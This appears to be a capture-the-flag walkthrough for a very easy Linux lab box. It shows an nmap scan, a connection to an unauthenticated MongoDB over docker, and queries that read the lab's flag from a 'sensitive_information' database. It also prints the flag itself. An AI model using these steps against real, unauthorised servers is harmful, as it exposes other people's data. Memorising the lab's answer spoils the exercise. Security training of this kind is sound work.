System: Linux
Difficulty: Very Easy

IP Address: 10.129.228.30

# System Flag

Ports are enumerated.
```
kali@kali:~$ sudo nmap 10.129.228.30 -sC -sV -p- -v
```

2 Ports were open.
```
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
27017/tcp open  mongodb MongoDB 3.6.8 3.6.8
```

Since the original `mongosh` command does not support the older version of the mongodb on the server machine, `docker` will be used with the corresponding older version.
```
docker run --rm -i --network host mongo:3.6 mongo mongodb://10.129.228.30:27017
```

After connection, the user will interact with the database.
```
show dbs;
admin                  0.000GB
config                 0.000GB
local                  0.000GB
sensitive_information  0.000GB
users                  0.000GB
```

The `sensitive_information` database is unusual, so it is now selected.
```
use sensitive_information;
switched to db sensitive_information
```

A flag table has been found inside.
```
show tables;
flag
```

The contents of the table are now listed.
```
db.flag.find();
{ "_id" : ObjectId("630e3dbcb82540ebbd1748c5"), "flag" : "1b6e6fb359e7c40241b6d431427ba6ea" }
```

The flag value can be found below.
```
1b6e6fb359e7c40241b6d431427ba6ea
```